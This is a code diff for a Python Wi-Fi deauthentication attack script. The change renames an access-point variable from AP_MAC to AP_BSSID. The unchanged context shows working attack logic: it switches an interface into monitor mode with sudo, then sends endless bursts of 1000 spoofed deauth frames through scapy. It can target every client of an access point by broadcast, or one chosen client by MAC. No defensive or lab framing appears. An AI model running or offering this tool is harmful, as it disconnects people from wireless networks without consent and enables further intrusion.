@@ -13,7 +13,7 @@ welcome = r"""
 print(welcome)
 
 INTERFACE = input("INTERFACE : ").strip()
-AP_MAC = input("AP MAC: ").strip().upper()
+AP_BSSID = input("AP BSSID: ").strip().upper()
 
 # Set interface to monitor mode
 os.system(f"sudo ip link set {INTERFACE} down")
@@ -45,7 +45,7 @@ def build_deauth_packets(target, ap):
 
 mode = input("Mode (1 = broadcast, 2 = unicast): ").strip()
 
-print(f"\nDeauthing AP: {AP_MAC}")
+print(f"\nDeauthing AP: {AP_BSSID}")
 print("Sending packets...")
 
 count = 0
@@ -53,12 +53,12 @@ try:
     while True:
         if mode == "1":
             # Broadcast deauth
-            for pkt in build_deauth_packets("ff:ff:ff:ff:ff:ff", AP_MAC):
+            for pkt in build_deauth_packets("ff:ff:ff:ff:ff:ff", AP_BSSID):
                 sendp(pkt, iface=INTERFACE, count=1000, inter=0.0001, verbose=0)
         elif mode == "2":
             # Unicast deauth
             client_mac = input("Client MAC: ").strip().upper()
-            for pkt in build_deauth_packets(client_mac, AP_MAC):
+            for pkt in build_deauth_packets(client_mac, AP_BSSID):
                 sendp(pkt, iface=INTERFACE, count=1000, inter=0.0001, verbose=0)
         count += 1000
         print(f"\rPACKETS: {count:,} | STATUS: DEAUTH", end="", flush=True)
